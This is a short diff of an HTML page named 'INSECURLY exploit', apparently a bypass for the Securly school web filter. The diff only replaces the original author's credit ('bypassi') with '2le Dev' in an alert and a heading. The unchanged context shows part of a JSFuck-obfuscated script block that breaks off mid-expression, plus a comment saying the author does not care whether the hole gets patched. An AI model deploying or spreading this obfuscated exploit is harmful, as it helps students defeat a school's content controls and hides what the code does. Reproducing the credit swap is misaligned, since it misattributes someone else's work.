@@ -24,7 +24,7 @@
             display: inline-block !important;
         }
     </style>
-    <script>alert('this exploit was found by bypassi, and the icons were made by ender (https://github.com/Ender-Ghost-Craft/insecurly-icons)</script>
+    <script>alert('V2 release by 2le Dev')</script>
     <!--   I personally could not care less whether this exploit gets patched -->
     <script defer>
         [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][
@@ -2354,7 +2354,7 @@
 </head>
 
 <body>
-    <h1>INSECURLY exploit (by bypassi)</h1>
+    <h1>INSECURLY exploit (by 2le Dev)</h1>
     <div id="error"></div>
     <div id="draggable" draggable="true">drag this button into a new tab!</div>
 </body>
